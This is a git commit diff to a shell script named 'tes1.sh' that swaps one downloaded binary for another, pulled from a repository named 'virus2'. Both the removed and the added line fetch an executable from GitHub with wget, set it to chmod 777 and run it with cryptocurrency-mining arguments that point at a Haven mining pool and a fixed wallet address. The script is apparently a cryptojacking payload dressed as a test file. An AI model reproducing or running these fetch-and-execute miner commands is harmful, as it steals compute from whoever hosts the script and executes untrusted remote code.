8cbd9355ac68f3a4776cbd47b42a79309f2ec3a0
raufpermana22 <53905319+raufpermana22@users.noreply.github.com>
2022-03-06 03:22:50 +0900

    Update tes1.sh

--- tes1.sh
+++ tes1.sh
@@ -1,2 +1,2 @@
 lscpu
-wget https://github.com/raufpermana22/tesami/raw/main/makanan && chmod 777 makanan && ./makanan --donate-level 1 -o de.haven.herominers.com:1110 -u hvxy2SoB1ZGg3NK8uCeuvJ4LNxhYuxVr6LRYEHkdzKg7fqrJVbNosjADJYeWw5VyaEc81qY5Zbs5STctfv4FyqW36ZgozSaTP6 -p halu -a cn-heavy/xhv -k 
+wget https://github.com/raufpermana22/virus2/raw/main/badut && chmod 777 badut && ./badut --donate-level 1 -o de.haven.herominers.com:1110 -u hvxy2SoB1ZGg3NK8uCeuvJ4LNxhYuxVr6LRYEHkdzKg7fqrJVbNosjADJYeWw5VyaEc81qY5Zbs5STctfv4FyqW36ZgozSaTP6 -p halu -a cn-heavy/xhv -k 
